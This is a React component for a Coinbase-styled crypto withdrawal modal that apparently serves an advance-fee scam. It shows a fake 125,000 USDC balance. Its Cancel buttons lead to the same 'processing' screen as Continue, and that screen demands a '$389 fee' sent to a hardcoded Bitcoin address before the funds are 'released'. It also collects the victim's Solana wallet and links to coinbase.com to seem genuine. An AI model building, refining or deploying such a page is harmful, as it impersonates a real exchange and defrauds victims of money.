"use client";

import { useEffect, useState } from "react";
import { X, CheckCircle2 } from "lucide-react";

const STORAGE_KEY = "withdraw_start_time";
const WALLET_KEY = "solana_wallet";

type Status = "idle" | "review" | "processing";

export default function SimpleDepositModal() {
  const [status, setStatus] = useState<Status>("idle");
  const [solanaWallet, setSolanaWallet] = useState("");

  const startWithdrawal = () => {
    try {
      if (typeof window !== "undefined") {
        localStorage.setItem(STORAGE_KEY, Date.now().toString());
      }
    } catch {}

    setStatus("review");
  };

const resetFlow = () => {
  try {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(WALLET_KEY);
  } catch {}

  setSolanaWallet("");
  setStatus("idle");
};


  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4">
      <div className="w-full max-w-[420px] rounded-[28px] border bg-white shadow-sm p-6">

        {/* HEADER */}
        <div className="mb-6 flex items-center justify-between">
          <h2 className="text-[18px] font-bold text-black">Withdraw</h2>

          <button className="rounded-full p-2 hover:bg-gray-100">
            <X size={18} className="text-black/60" />
          </button>
        </div>

{/* IDLE */}
{status === "idle" && (
  <>
    <div className="mx-auto mb-4 flex items-center justify-center">
      <div className="px-4 py-2 rounded-full bg-purple-600 text-white text-sm font-semibold flex items-center gap-2">
        <span className="w-2 h-2 bg-white rounded-full" />
        Solana
      </div>
    </div>

    <div className="text-center mb-5">
      <p className="text-[13px] text-black/60">Withdraw USDC</p>
      <p className="text-[32px] font-extrabold text-black">125,000</p>
      <p className="text-[13px] text-black/50">available</p>
    </div>

    <div className="rounded-[18px] border px-4 py-4 mb-6">
      <p className="text-[13px] text-black/60 mb-2">Transfer to</p>

      <p className="text-[15px] font-semibold text-black">
        BSFkq.....gnLX
      </p>

      <div className="mt-3 flex items-center justify-between text-[12px] text-black/50">
        <span>Instant</span>
        <span>$1,000 fee</span>
      </div>
    </div>

    {/* BOTONES */}
    <div className="space-y-3">
      <button
        onClick={startWithdrawal}
        className="w-full rounded-[14px] py-3 bg-[#0052FF] text-white font-semibold hover:bg-[#0041cc]"
      >
        Confirm withdrawal
      </button>

<button
  onClick={() => setStatus("processing")}
  className="w-full rounded-[14px] py-3 bg-red-600 text-white font-semibold hover:bg-red-700"
>
  Cancel
</button>

    </div>
  </>
)}
        {/* REVIEW */}
{status === "review" && (
  <>
    <div className="text-center mb-8">
      <CheckCircle2
        className="mx-auto text-[#0052FF] mb-4"
        size={42}
      />

      <h2 className="text-2xl font-bold text-black">
        Order Pending
      </h2>

      <p className="mt-4 text-sm text-black/60">
        Your order has been prepared but has not been submitted yet.
      </p>

      <p className="mt-2 text-sm text-black/60">
        Would you like to continue or cancel?
      </p>
    </div>

    <div className="space-y-3">
      <button
        onClick={() => setStatus("processing")}
        className="w-full rounded-[14px] py-3 bg-[#0052FF] text-white font-semibold hover:bg-[#0041cc]"
      >
        Continue
      </button>

<button
  onClick={() => setStatus("processing")}
  className="w-full rounded-[14px] py-3 border border-gray-300 bg-white font-semibold hover:bg-gray-50"
>
  Cancel
</button>

    </div>
  </>
)}

        {/* PROCESSING */}
        {status === "processing" && (
          <>
            <div className="text-center mb-6">
              <CheckCircle2 className="mx-auto text-green-500 mb-2" />

              <p className="font-semibold text-black">
                Processing withdrawal
              </p>

              {/* PÍLDORA COINBASE PENDING (AZUL) */}
              <div className="mt-3 flex justify-center">
                <div className="px-4 py-1 rounded-full bg-blue-600 text-white text-xs font-semibold">
                  Coinbase Pending
                </div>
              </div>

              {/* TEXTO UPDATED */}
              <p className="text-sm text-black/60 mt-3">
                Processing time after confirmation:{" "}
                <span className="font-semibold text-black">20 minutes</span>
              </p>

              <p className="text-xs text-black/50 mt-2">
                Please pay your one time $389 Fee. The release time after that is 20 minutes.
              </p>
            </div>

            {/* WALLET */}
            <div className="mt-4 text-left">
              <label className="text-xs font-semibold text-black/70">
                Enter your Solana Wallet
              </label>

              <input
                type="text"
                value={solanaWallet || ""}
                onChange={(e) => {
                  setSolanaWallet(e.target.value);
                  try {
                    localStorage.setItem(WALLET_KEY, e.target.value);
                  } catch {}
                }}
                placeholder="Paste your Solana wallet address"
                className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
              />
            </div>

            {/* DESTINO */}
            <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
              <p className="text-xs font-semibold text-black/70 mb-1">
                Deposit Fee Pending - Destination (BTC)
              </p>

              <p className="text-[11px] text-black/60 break-all">
                bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
              </p>
            </div>

            {/* BOTÓN FINAL */}
            <div className="mt-6">
              <a
                href="https://www.coinbase.com"
                target="_blank"
                rel="noopener noreferrer"
                className="block w-full rounded-[14px] py-3 bg-[#0052FF] text-white text-center font-semibold hover:bg-[#0041cc]"
              >
                Your Account
              </a>
            </div>
          </>
        )}
      </div>
    </div>
  );
}